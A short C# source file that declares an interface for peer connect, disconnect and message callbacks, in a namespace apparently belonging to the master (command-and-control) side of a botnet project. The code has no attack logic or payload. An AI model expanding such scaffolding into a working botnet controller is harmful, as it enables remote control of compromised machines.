using CozyThunder.Botnet.Common;

namespace CozyThunder.Botnet.Master
{
    interface IMasterConnectorListener
    {
        void OnConnect(Peer peer);
        void OnDisConnect(Peer peer);
        void OnMessage(Peer peer, byte[] msg);
    }
}
